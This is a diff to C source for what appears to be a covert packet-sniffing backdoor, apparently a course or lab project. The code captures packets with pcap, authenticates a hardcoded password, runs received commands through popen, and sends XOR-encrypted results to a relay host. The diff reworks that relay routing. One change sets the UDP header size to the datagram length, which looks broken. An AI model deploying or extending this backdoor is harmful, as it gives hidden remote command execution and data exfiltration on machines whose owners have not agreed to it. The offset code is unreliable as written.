@@ -1,9 +1,10 @@
 #include "pktcap.h"
 
-/*static void set_done_flag (int);*/
+/* globals */
 static volatile sig_atomic_t doneflag = 0;
 int dest_relay_port, relay_mode = FALSE;
 char relay_host[BUFFER];
+
 /*--------------------------------------------------------------------------------------------------------------------
 -- FUNCTION: startPacketCapture
 -- 
@@ -85,11 +86,13 @@ int startPacketCapture(pcap_t * nic_descr, struct bpf_program fp, int dst,
 		exit(1);
 	}
 	
-	if(dst == FROM_RELAY)
+	if(dst == FROM_RELAY || dst == FROM_CLIENT)
 	{
 		dest_relay_port = dest_port;
 		strcpy(relay_host, dest_host);
-		relay_mode = TRUE;
+		
+		if(dst == FROM_RELAY)
+			relay_mode = TRUE;
 	}
 
 	/* Use callback to process packets */
@@ -188,7 +191,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 		
 		/* define/compute udp header offset */
 		udp = (struct udp_struct *)(packet + SIZE_ETHERNET + size_ip);
-		size_udp = 8;
+		size_udp = ntohs(udp->uh_ulen);
 
 		/* define/compute udp payload (segment) offset */
 		payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_udp);
@@ -219,7 +222,7 @@ void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr* pkt_header, const 
 	if(mode == SERVER_MODE && (strcmp(password, PASSWORD) == 0))
 	{
 		fprintf(stderr, "Password Authenticated. Executing command.\n");
-		process_command(command, ip, ip->ip_p == IPPROTO_TCP ? ntohs(tcp->th_sport) : ntohs(udp->uh_sport), ip->ip_p);
+		process_command(command, get_ip_addr(NETWORK_INT), relay_host, dest_relay_port, ip->ip_p);
 		free(command);
 		free(decrypted);
 		return;
@@ -365,17 +368,12 @@ int parse_cmd(char * command, char * data, int size)
 -- 
 -- NOTES: Processes a command and gets the results.  encrypts and sends packet of results to originating host
 ----------------------------------------------------------------------------------------------------------------------*/
-int process_command(char * command, const struct ip_struct * ip, const int dest_port, int protocol)
+int process_command(char * command, const char * src_ip, const char * dest_ip, const int dest_port, int protocol)
 {
 	FILE *fp;
 
 	char cmd_results[PKT_SIZE];
 	char packet[PKT_SIZE];
-	char src[BUFFER];
-	char dst[BUFFER];
-
-	strcpy(src, inet_ntoa(ip->ip_dst));
-	strcpy(dst, inet_ntoa(ip->ip_src));
 
 	if((fp = popen(command, "r")) == NULL)
 	{
@@ -393,7 +391,7 @@ int process_command(char * command, const struct ip_struct * ip, const int dest_
 		
 		//Send it over to the client
 		iSeed(xor_key, 1);
-		send_packet(xor_cipher(packet, strlen(packet)), protocol, strlen(packet), src, dst, dest_port);
+		send_packet(xor_cipher(packet, strlen(packet)), protocol, strlen(packet), src_ip, dest_ip, dest_port);
 		
 		memset(packet, 0, sizeof(packet));
 		memset(cmd_results, 0, sizeof(cmd_results));
